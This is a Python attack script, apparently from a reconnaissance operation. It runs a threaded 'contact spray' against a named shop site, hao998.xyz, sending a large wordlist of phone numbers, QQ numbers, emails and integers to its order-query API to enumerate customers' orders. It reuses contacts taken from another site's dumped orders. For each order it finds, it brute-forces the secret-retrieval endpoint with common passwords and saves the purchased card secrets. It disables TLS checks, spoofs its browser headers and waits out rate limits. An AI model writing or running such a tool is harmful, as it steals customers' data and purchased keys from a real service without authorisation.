#!/usr/bin/env python3
"""hao998 contact spray — direct HK (no Tor), threaded."""
import json
import os
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()

OUT = Path("/data/recon/hao998/dump")
OUT.mkdir(parents=True, exist_ok=True)
B = "https://hao998.xyz"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
STATE = OUT / "contact_spray_fast_state.json"
HITS = OUT / "contact_hits.json"
KAMI = OUT / "contact_kami.tsv"
LOG_EVERY = 200
WORKERS = int(os.environ.get("WORKERS") or "12")

lock = threading.Lock()
stats = {"done": 0, "hits": 0, "kami": 0, "errors": 0}


def log(*a):
    print(*a, flush=True)


def build_wordlist():
    words = []
    for extra in [OUT / "extra_words.txt", Path("/data/recon/suran888.top/orders/contacts.txt")]:
        if extra.exists():
            for line in extra.read_text(errors="ignore").splitlines():
                w = line.strip()
                if w and len(w) <= 64:
                    words.append(w)
    proven = [
        "10086", "10010", "10000", "123456", "123456789", "123123", "112233",
        "111222", "11122", "147258369", "5201314", "520520", "1314", "1314520",
        "666666", "888888", "666555", "555888", "778899", "123654", "321321",
        "111111", "000000", "123321", "654321", "admin", "test", "test@test.com",
        "1519", "2219", "7124", "9090", "9417", "131187", "101300", "155",
        "13800138000", "18888888888", "12345", "54321", "8888", "6666",
        "hao998", "303977864", "86081976", "qq.com", "163.com",
    ]
    words.extend(proven)
    for i in range(1, 20001):
        words.append(str(i))
    # QQ-like 5-11 digits common as contact
    for i in range(10000, 120000, 7):
        words.append(str(i))
    for local in ["test", "admin", "qq", "123", "aaa", "abc", "user", "a", "1", "xx"]:
        for dom in ["qq.com", "163.com", "126.com", "gmail.com", "test.com"]:
            words.append(f"{local}@{dom}")
    # shop-style emails
    for n in range(1, 50):
        words.append(f"{n}@qq.com")
        words.append(f"qq{n}@qq.com")
    seen, out = set(), []
    for w in words:
        if w not in seen:
            seen.add(w)
            out.append(w)
    return out


def session():
    s = requests.Session()
    s.verify = False
    s.headers.update(
        {
            "User-Agent": UA,
            "Origin": B,
            "Referer": B + "/user/index/query",
            "X-Requested-With": "XMLHttpRequest",
        }
    )
    return s


def extract_orders(j):
    if not isinstance(j, dict) or j.get("code") != 200:
        return []
    data = j.get("data")
    if isinstance(data, list):
        return [x for x in data if isinstance(x, dict)]
    if isinstance(data, dict):
        lst = data.get("list") or []
        if isinstance(lst, list):
            return [x for x in lst if isinstance(x, dict)]
    return []


def handle_hit(s, kw, orders, hits, kami_lines):
    for od in orders:
        od = dict(od)
        od["_query_kw"] = kw
        hits.append(od)
        tn = od.get("trade_no")
        if od.get("secret"):
            kami_lines.append(f"{tn}\t{kw}\tquery\t{od['secret']}")
            stats["kami"] += 1
            log("KAMI_QUERY", tn, kw)
        if not tn:
            continue
        for pw in ["", "123456", "000000", "888888", str(kw)]:
            try:
                r = s.post(B + "/user/api/index/secret", data={"orderId": tn, "password": pw}, timeout=12)
                body = r.text
            except Exception as e:
                body = str(e)
            log("secret", tn, repr(pw), body[:160].replace("\n", " "))
            try:
                sj = r.json()
            except Exception:
                sj = None
            if isinstance(sj, dict) and sj.get("code") == 200 and sj.get("data"):
                secret = sj["data"].get("secret") if isinstance(sj["data"], dict) else sj["data"]
                kami_lines.append(f"{tn}\t{kw}\t{pw}\t{secret}")
                stats["kami"] += 1
                log("KAMI", tn, kw)
                break
            if "还未支付" in body or "未查询到" in body:
                break


def worker(kw):
    s = session()
    try:
        r = s.post(B + "/user/api/index/query", data={"keywords": kw}, timeout=12)
        body = r.text
        j = r.json() if body.startswith("{") else None
    except Exception as e:
        with lock:
            stats["errors"] += 1
            stats["done"] += 1
        return None
    if isinstance(j, dict) and "频繁" in str(j.get("msg")):
        return ("throttle", kw)
    orders = extract_orders(j)
    with lock:
        stats["done"] += 1
        if orders:
            stats["hits"] += 1
            return ("hit", kw, orders, body)
        if stats["done"] % LOG_EVERY == 0:
            log("progress", stats["done"], "hits", stats["hits"], "kami", stats["kami"], "last", kw)
            STATE.write_text(json.dumps(stats, ensure_ascii=False), encoding="utf-8")
    return None


def main():
    words = build_wordlist()
    limit = int(os.environ.get("SPRAY_LIMIT") or "0")
    if limit:
        words = words[:limit]
    log("words", len(words), "workers", WORKERS)

    hits = []
    if HITS.exists():
        try:
            hits = json.loads(HITS.read_text())
        except Exception:
            hits = []
    kami_lines = KAMI.read_text(encoding="utf-8").splitlines() if KAMI.exists() else []

    s_main = session()
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(worker, w): w for w in words}
        for fut in as_completed(futs):
            res = fut.result()
            if not res:
                continue
            if res[0] == "throttle":
                log("THROTTLE", res[1], "sleep")
                time.sleep(20)
                continue
            if res[0] == "hit":
                _, kw, orders, body = res
                log("HIT", kw, "n", len(orders), body[:200].replace("\n", " "))
                handle_hit(s_main, kw, orders, hits, kami_lines)
                HITS.write_text(json.dumps(hits, ensure_ascii=False, indent=2), encoding="utf-8")
                KAMI.write_text("\n".join(kami_lines) + ("\n" if kami_lines else ""), encoding="utf-8")

    STATE.write_text(json.dumps(stats, ensure_ascii=False, indent=2), encoding="utf-8")
    HITS.write_text(json.dumps(hits, ensure_ascii=False, indent=2), encoding="utf-8")
    KAMI.write_text("\n".join(kami_lines) + ("\n" if kami_lines else ""), encoding="utf-8")
    log("DONE", stats)


if __name__ == "__main__":
    main()
